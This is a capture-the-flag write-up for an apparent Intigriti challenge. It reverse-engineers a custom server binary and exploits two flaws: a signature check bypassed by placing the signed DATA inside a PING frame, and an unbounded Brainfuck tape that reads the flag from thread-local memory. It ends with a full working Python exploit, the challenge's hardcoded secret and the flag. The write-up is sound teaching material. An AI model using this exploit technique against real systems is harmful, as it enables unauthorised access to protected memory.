### Challenge_1126.md

Am going to walk through the process of which I went through to solve Integriti's monthly challenge num 1126 
(Late Nov of 2026), It was an interesting challenge that mainly focused on 
binary reverse engineering

The general steps of which I went through to solve the challenge are as follows: 

- Web recon to download the vulnerable binary
- Analyzing the binary to find a memory Out-Of-Bounds read of which can read anything loaded into the binary, including the flag
- Exploit the vulnerability to the retrieve the flag

### Recon
My first step was heading to `https://challenge-1126.challenges.intigriti.io/login.html` and checking out any sort of functionality that either 
- A : exposed anything remotely sensitive (which is always the premise of these challenges)
- B : Logic issue, more specifically a bypass that leads to finding A<br>

So you know, I did the usual, I tried default pass spraying to go through the login, I passed everything to burp in order for its crawler to find anything, I checked the tech stack using tools and static analysis
which got me this : 
```
HTTP/1.1 200 
content-length: 2230
content-type: text/html
date: Wed, 25 Nov 2026 05:23:40 GMT
server: istio-envoy
x-envoy-upstream-service-time: 1
x-powered-by: superfastserver Version 2.0.0
```
(the application is powered by a custom server named `superfastserver`) <br>
At the same time, 
within the source code of the login page (and the obvious link), I found the page leading to the docs of said custom server implantation (for the same version)

<img width="862" height="207" alt="screenshotd" src="https://github.com/user-attachments/assets/e4d4268f-6059-47e8-83ee-54ac98f6fbcb" />

Now, I started looking for anything leading to or listing the binary file but to no avail. So i tried fuzzing which landed at my first shot at it
`https://challenge-1126.challenges.intigriti.io/superfastserver`
The latter lead to and endpoint of which the browser tried to render the binary file in `text/html` and of course that would result in garbled text but it did give out some quick,juicy info without dissembling 
the binary
It was mainly 2 important pieces of information regarding to the binary :
1. The 'very good secret' responsible for RSA signature verification, which we will need in our payload was `SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033`
2. The protocol endpoint responsible for processing our request `/custom_protocol`

The third was the protocol's handshake, what it expects and what it can serve, take a look at this string:
`AUTHACKNAKPNAKHNAKLPONGFERRNAKSNAKCNAKOC9A3944A98B450E692740F5F90A0CD3FF860350661676DFE1E746DA6038B3AF7BD847858244C695AD98A70F27DE1499C40A8B738<cut>`
The string is composed of two parts, one are the symbols of which the server responds with, and are as follows : 
```
AUTH
ACK
NAKP
NAKH
NAKL
PONG
FERR
NAKS
NAKC
NAKO
NAKR
LEET
INVC
```
All of these are response codes the protocol endpoint can respond with

After that we can use the next command to download the file as an ELF and review its basic info/properties : 
```
curl -s 'https://challenge-1126.challenges.intigriti.io/superfastserver' -o superfastserver && file superfastserver

superfastserver: ELF 64-bit LSB pie executable,
x86-64, version 1 (SYSV),
dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=d2c861447de60ff0a8cd9daf9a7e0cf2bf3499e0, for GNU/Linux 3.2.0, stripped
```
the binary file is stripped, which is expected for general use binaries, which further mimics IRL prod but its going to be a bit harder for us to disassemble, as there are no symbols that give us a better
understanding of what the binary does

### **Now we can start** with the ACTUAL challenge, as all of the before was a prelude to main RE 
#### Binary Analysis

Rather than blindly digging through assembly, I started by looking for interesting strings, Like those we met before at the `text/html` dump, as well as functions that appeared to handle incoming requests.

One thing that caught my attention was the custom protocol itself. The server had several commands, including `CODE`, `DATA`, `SIGN`, `EXEC`, and `HELP`, which further emphasizes the signed mechanism we saw at the docs (previous screenshot)

At this point, instead of trying to exploit random functionality, I decided to understand how the protocol worked first, I started by going to the function that's responsible for processing `AUTH`, which was at
offset `0x5cb0` in the ELF.

Since the binary is PIE-enabled,that means these are offsets within the binary's address layout rather than fixed absolute addresses that will necessarily remain the same at runtime, so we need to work with the 
offsets of info rather than a straightforward address fetching

I started examining how the handler receives input, how it determines which command is being sent, and what it does with each command's payload.

### Understanding the Protocol

Before looking into the actual vulnerability, I needed to understand how to communicate with the endpoint.

The protocol uses a fairly straightforward frame structure:

```text
Marker (1) --> w  
Payload length (4) --> Little-endian uint32
Command (4) --> CODE/DATA/etc.      |
Payload --> Payload bytes (as long as it fits within uint32)

```

Breaking this down:

- **Marker:** A single byte, `w`, indicating the beginning of a frame.
- **Payload length:** A 4-byte little-endian integer describing the payload's size.
- **Command:** A 4-byte identifier specifying which operation the server should perform.
- **Payload:** The actual bytes associated with the command. This can be empty.

An important detail here is that the length field describes the payload only. It does not include the four-byte command identifier.

For example, a HELP request with no payload can be constructed like this:

```python
def frame(cmd, payload=b""):
    return (
        b"w"
        + len(payload).to_bytes(4, "little")
        + cmd
        + payload
    )

frame(b"HELP")
```

The server also expects the 106-byte authentication secret before the command frames (which was that secret we found in the text dump),
This is important because sending a correctly formatted command without the expected authentication prefix isn't enough to reach the functionality we're aiming at and the server would just reject it.

So a complete HELP request looks like this:

```python
body = SECRET + frame(b"HELP")
```

Where `SECRET` is the hardcoded authentication string we recovered from the binary.

### The HELP command & Getting the original components

One particularly useful command was `HELP`.

Instead of having to figure out how to construct valid CODE, DATA, and SIGN components from zero, HELP returned the original components supplied by the challenge.

Which go as follows :

| Component | Size | Purpose |
|---|---:|---|
| CODE | 396 bytes | Original signed CODE component |
| DATA | 424 bytes | Original signed DATA component |
| SIGN | 256 bytes | Signature associated with the original components |

This was a very useful discovery. It meant that I already had a valid set of components and their corresponding signature to test with. I didn't need to forge a signature or break the crypto algorithm itself.

All I needed to understand was how the server decided which bytes to authenticate and which bytes to execute.

I had AI write me a small parser to extract the returned frames:

```python
def parse_frames(raw):
    frames = {}
    pos = 0

    while True:
        pos = raw.find(b"w", pos)

        if pos < 0 or pos + 9 > len(raw):
            break

        length = int.from_bytes(raw[pos + 1:pos + 5], "little")
        end = pos + 5 + length

        if length < 4 or end > len(raw):
            pos += 1
            continue

        command = raw[pos + 5:pos + 9]
        payload = raw[pos + 9:end]

        frames[command] = payload
        pos = end

    return frames
```

The parser searches for the frame marker, reads the payload length, extracts the command identifier, and then stores the corresponding payload.

With that, retrieving the original components became as simple as:

```python
response = requests.post(
    URL,
    data=SECRET + frame(b"HELP")
)

parts = parse_frames(response.content)

code = parts[b"CODE"]
data = parts[b"DATA"]
sign = parts[b"SIGN"]
```

Now I had everything needed to investigate the signature verification mechanism.

### What was being verified?

I followed the execution path of the `EXEC` command and saw how the server handled the supplied components before doing anything with them.

What I found was that the server copies incoming payloads into an aggregate buffer. It also keeps track of the offsets and lengths of certain components so that it can reference them later to fetch.

In the function's stack frame, I identified the variables responsible for tracking these values:

| Component | Offset variable | Length variable |
|---|---|---|
| CODE | `[rbp-0x490]` | `[rbp-0x498]` |
| DATA | `[rbp-0x4a0]` | `[rbp-0x4a8]` |
| SIGN | `[rbp-0x4b0]` | `[rbp-0x4b8]` |

These are local variables stored relative to the function's base pointer. They are not the actual offsets inside the aggregate buffer themselves; but they do hold the values used to reference those locations.

The important part was how these values were populated.

For CODE, DATA, and SIGN, the handler records the location and length of their payloads. However, when it processes a PING command, it copies the payload into the aggregate buffer without recording it as one of these components.

At first, this might not seem particularly interesting. PING is supposed to be a simple command that returns PONG.

The problem becomes apparent when looking at how the verifier uses the recorded offsets.

The verifier starts at the recorded CODE offset and uses the combined lengths of CODE and DATA to determine the amount of data that should be authenticated.

Concept wise, the operation looks something like this:

```c
signed_data = buffer + code_offset;
signed_length = code_length + data_length;

verify_signature(
    signed_data,
    signed_length,
    signature
);
```

_(This is simplified pseudocode representing the relevant behavior)_

Notice what's missing: there is no validation that the DATA component actually begins immediately after CODE.

In other words, the verifier __assumes__ that the following relationship is true:

```text
DATA_offset == CODE_offset + CODE_length
```

But the server never properly enforces that assumption.

And that's the root of the vulnerability.

### The Signature Bypass

The next step was to understand whether I could exploit this discrepancy to make the server authenticate one set of bytes while executing another.

Remember that PING payloads are copied into the aggregate buffer but aren't recorded as signed components?

This gives us a way to manipulate the layout of the data that the verifier sees.

Let's start with the original components:

```text
CODE = Original CODE (396 bytes)
DATA = Original DATA (424 bytes)
SIGN = Original signature (256 bytes)
```

Normally, the relevant part of the aggregate buffer would look like:

```text
+--------------------+--------------------+
| Original CODE      | Original DATA      |
| 396 bytes          | 424 bytes          |
+--------------------+--------------------+
```

The verifier starts at the beginning of CODE and authenticates a total of:

```text
396 + 424 = 820 bytes
```

So far, everything is fine.

BUT, what if when we insert a PING payload between CODE and DATA?

Instead of sending the components in their original order, I constructed the following sequence:

```text
CODE(original CODE)
PING(original DATA)
DATA(modified DATA)
SIGN(original SIGN)
EXEC
```

The resulting aggregate buffer now looks like this:

```text
+--------------------+--------------------+--------------------+
| Original CODE      | Original DATA      | Modified DATA      |
| 396 bytes          | 424 bytes          | 424 bytes          |
+--------------------+--------------------+--------------------+
          ^                    ^                    ^
          |                    |                    |
      CODE_offset         PING payload          DATA_offset
```

This is the key to the bypass.

The verifier starts at `CODE_offset` and authenticates 820 bytes:

```text
396 bytes of CODE + 424 bytes of PING payload
```

Those are exactly the original CODE and DATA bytes for which we already have a valid signature.

However, the interpreter doesn't use the same starting position as the verifier. It retrieves the program using the separately recorded `DATA_offset`.

Since that offset points to the real DATA frame, the interpreter ends up consuming our modified DATA payload instead.

And thus we have created two different views of the same request:

**What the signature verifier sees:**

```text
origianl CODE + original DATA
```

**What the interpreter executes:**

```text
modified DATA
```

The original signature is still valid because we never changed the bytes being authenticated. We only messed around with their placement in the aggregate buffer.

This is not a cryptographic break, nor did I have to forge or modify the signature. The vulnerability exists because the server fails to guarantee that the data being authenticated is the same data being consumed by the interpreter.

At this point, I had a signature verification bypass and could get my own Brainfuck(lol) program executed.

But what could I do with that?

### Looking beyond the interpreter's TAPE

After the execution logic, I moved on to the Brainfuck interpreter itself.

The interesting part here wasn't really the language or its instructions. It was how the interpreter managed its tape and (crucially), where that tape was located in memory.

I searched the binary for references to the flag file and found the code responsible for loading it.

The relevant routine opens:

```text
/the_real.flag
```

It then reads up to `0x51` bytes (81 bytes) into a buffer that is initialized to zero.

After reading the flag, the server copies the bytes into thread-local storage (TLS) using FS-relative memory writes.

This was important because the interpreter's tape was also initialized relative to the same thread's FS base.

Looking at the interpreter initialization, I found the following instructions:

```asm
mov rcx, qword fs:0x0
lea rsi, [rcx-0x160]
```

The first instruction retrieves the thread pointer from `FS:0`. The second instruction calculates the initial tape pointer at:

```text
FS_base - 0x160
```

At the same time, the flag is copied into TLS beginning at:

```text
FS_base - 0x60
```

Now, all we need is a little arithmetic:

```text
Flag address       = FS_base - 0x60
Interpreter tape  = FS_base - 0x160

Difference:
0x160 - 0x60 = 0x100 = 256 bytes
```

In other words, the flag begins exactly 256 bytes after the interpreter's initial tape pointer.

This is the important relationship:

```text
lower memory address

FS_base - 0x160  <-- interpreter's initial tape pointer
       |
       | 256 bytes
       |
FS_base - 0x60   <-- beginning of the flag

higher memory address
```

The interpreter was supposed to operate on its own tape, but there was no effective boundary enforcement preventing it from moving beyond that intended region.

Since Brainfuck provides an instruction that moves the tape pointer forward, we could simply move 256 cells and reach the beginning of the flag and read it.

And since the interpreter also supports outputting the current cell, we could read the flag one byte at a time while moving.

### Constructing the Memory Read

For this part, it's useful to understand a couple of Brainfuck instructions:

| Instruction | Behavior |
|---|---|
| `>` | Move the tape pointer one cell forward |
| `<` | Move the tape pointer one cell backward |
| `+` | Increment the current cell |
| `-` | Decrement the current cell |
| `.` | Output the current cell |
| `,` | Read one byte into the current cell |

The two instructions we're going to use `>` and `.`.

Since the flag starts 256 bytes after the tape pointer, we first need:

```python
b">" * 256
```

That gets us to the beginning of the flag.

Next, we need to output the 81 bytes that the server reads into TLS.

My first attempt was:

```python
exploit = b">" * 256 + b"." * 81
```

And this didn't work as expected.

Instead of getting the flag, I kept receiving the same character repeated.

The reason was stupid: the `.` instruction outputs the current cell but does not advance the pointer.

So, executing:

```text
.....
```

doesn't output five consecutive bytes. It outputs the exact same byte five times.

The fix is to advance the pointer after every output:

```python
exploit = b">" * 256 + b".>" * 81
```

Breaking this down:

1. `>` repeated 256 times moves the pointer to the beginning of the flag.
2. `.` outputs the current byte.
3. `>` advances to the next byte.
4. Repeating `.>` outputs consecutive bytes from memory.

The server reads `0x51` bytes, which is 81 bytes, so I used 81 output operations.

One final detail: the original DATA component is 424 bytes, while our Brainfuck program is only 418 bytes:

```text
256 + (81 * 2) = 418 bytes
```

I therefore padded the program with six NUL bytes to preserve the original DATA component's length for the sake of consistency:

```python
exploit = exploit.ljust(424, b"\x00")
```

This keeps the DATA length unchanged and ensures that the modified payload fits the expected component size.

### COMPLETE summary and POC

At this point, we have all the pieces:

- The original CODE, DATA, and SIGN components from HELP.
- A way to make the verifier authenticate the original DATA while the interpreter executes our modified DATA.
- A Brainfuck program that moves 256 bytes forward and outputs 81 consecutive bytes.
- The original authentication secret required by the protocol.

All that's left is to combine everything into a single request.

Here's the complete PoC:

```python
import requests

URL = "https://challenge-1126.challenges.intigriti.io/custom_protocol"

SECRET = (
    b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_"
    b"1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"
)

def frame(cmd, payload=b""):
    return (
        b"w"
        + len(payload).to_bytes(4, "little")
        + cmd
        + payload
    )

def parse_frames(raw):
    frames = {}
    pos = 0

    while True:
        pos = raw.find(b"w", pos)

        if pos < 0 or pos + 9 > len(raw):
            break

        length = int.from_bytes(raw[pos + 1:pos + 5], "little")
        end = pos + 5 + length

        if length < 4 or end > len(raw):
            pos += 1
            continue

        command = raw[pos + 5:pos + 9]
        payload = raw[pos + 9:end]

        frames[command] = payload
        pos = end

    return frames


# Retrieve the original signed components.
r = requests.post(
    URL,
    data=SECRET + frame(b"HELP"),
    timeout=20
)
r.raise_for_status()

parts = parse_frames(r.content)

code = parts[b"CODE"]
data = parts[b"DATA"]
sign = parts[b"SIGN"]


# Construct the Brainfuck memory-read payload.
exploit = b">" * 256 + b".>" * 81
exploit = exploit.ljust(len(data), b"\x00")


# Place the original DATA inside PING,
# then supply our modified DATA separately.
body = SECRET + b"".join([
    frame(b"CODE", code),
    frame(b"PING", data),
    frame(b"DATA", exploit),
    frame(b"SIGN", sign),
    frame(b"EXEC")
])


# Execute the crafted request.
r = requests.post(URL, data=body, timeout=20)
r.raise_for_status()

marker = b"ACK\x00ACK\x00PONGACK\x00ACK\x00"

if marker not in r.content:
    raise RuntimeError(f"Expected response marker not found: {r.content!r}")

output = r.content.split(marker, 1)[1][:81]

print(output.rstrip(b"\x00").decode())
```
(AI generated POC btw)

The response contained the flag:

```text
INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}
```

### Root Cause and an overall summary

Looking back at the challenge, there were two important flaws that made the finale possible.

**1. Inconsistent signature verification and exec**

The server authenticates a byte range determined by the CODE offset and the combined CODE/DATA lengths, but executes DATA from a separately recorded offset.

Because it does not enforce that DATA immediately follows CODE, and because PING payloads can occupy space in the aggregate buffer without being registered as signed components, 
the verifier and interpreter can consume different data.

The important lesson here is that cryptographic verification is only useful when the exact bytes being authenticated are the exact bytes later consumed by the application, if they're not then well, the whole point of 
signature verification is blown out of the water

**2. Missing memory boundary checks in the interpreter**

The Brainfuck interpreter allows its tape pointer to move beyond itsregion without enforcing a boundary.

Since the tape is located close to other thread-local data, this allows the interpreter to read memory that it was never supposed to access.

In this case, that memory contained the flag.

Properly validating pointer movement and keeping the interpreter's tape within an isolated, bounded memory region would prevent this kind of disclosure.

#### _Finalement_

This was a pretty fun challenge because it required more than simply finding an exposed endpoint or an obvious input validation issue.

The interesting part was understanding how the different pieces interacted: the custom protocol, the signature verification logic, the aggregate buffer, the Brainfuck interpreter as well as the TLS memory layout, which
overloaded made me and had me research a ton of sh-t to learn

It gave me a bit of a headache, but it was worth it. :) 

(hope you enjoyed my write-up since its my first one ever)
